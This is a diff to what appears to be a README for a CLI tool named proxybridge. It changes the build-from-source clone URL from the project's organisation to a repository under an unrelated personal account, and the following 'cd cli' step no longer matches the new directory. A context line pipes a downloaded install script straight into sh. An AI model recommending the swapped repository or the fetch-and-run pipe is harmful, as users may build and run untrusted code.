@@ -22,7 +22,7 @@ curl -fsSL https://proxybridge.com/install.sh | sh
 
 ```bash
 # Build from source
-git clone https://github.com/proxybridge/cli.git
+git clone https://github.com/root975638-alt/proxybridge.git
 cd cli
 go build -o proxybridge
 
